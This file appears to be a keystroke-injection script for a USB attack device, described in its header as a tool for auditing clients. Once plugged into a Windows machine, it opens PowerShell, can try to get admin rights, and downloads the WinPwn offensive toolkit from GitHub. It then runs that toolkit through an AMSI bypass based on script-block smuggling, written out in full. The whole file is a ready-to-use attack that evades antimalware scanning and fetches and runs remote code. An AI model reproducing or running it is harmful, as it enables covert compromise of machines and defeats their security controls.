/*
AMSI Bypass Skript-Block-Smuggling, load Winpwn from Web repo
// USE IT TO AUDIT CLIENTS. Best way is to store winpwn.ps1 locally at the webserver http://172.16.0.1
Created by: S3cur3Th1sSh1t (https://github.com/S3cur3Th1sSh1t/WinPwn)
author: Klau5t4ler0x90
*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"

// sets typing speed to "natural"
//very slow. My grandma is faster in keyboard kungfu!! Don't use it for empire shell base64 encoded text!!!!
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell");
    press("ENTER");
}

//alternative to run Powershell as admin, if the user have local admin rights or is a domain admin:
function win10AsAdmin() {
    press("GUI"); //open search
    delay(500);
    type(ps_wow64); //enter target binary
    delay(1000); // wait for search to finish
    press("RIGHT");
    delay(200);
    press("DOWN");
    delay(200);
    press("ENTER");
    delay(1000); 
    press("LEFT");
    press("ENTER");
}

// change Folder to temp / sometimes change to tmp
function backToTemp() {
    type("cd ..");
  press("ENTER");
  type("cd ..");
  press("ENTER");
  type("cd ..");
  press("ENTER");
  type("cd temp");
  press("ENTER");
}

// Bypass AMSI and run winpwn.ps1 by S3cur3Th1sSh1t
function AMSIBypass() {
  type("$531 = (new-Object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/refs/heads/master/WinPwn.ps1')");
  press("ENTER");
  type("$SpoofedAst = [ScriptBlock]::Create(\"Write-Output 'Hello'\").Ast")
  press("ENTER");
  type("$ExecutedAst = [ScriptBlock]::Create(\"$531\").Ast")
  press("ENTER");
  type("$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent, $null, $null, $null, $ExecutedAst.EndBlock.Copy(),$null)")
  press("ENTER");
  type("$Sb = $Ast.GetScriptBlock()");
  press("ENTER");
  type("& $Sb");
  press("ENTER");
}

layout('de');			// DE keyboard layout
fast();

startPS();
delay(1000);
backToTemp();
delay(1100);
AMSIBypass();
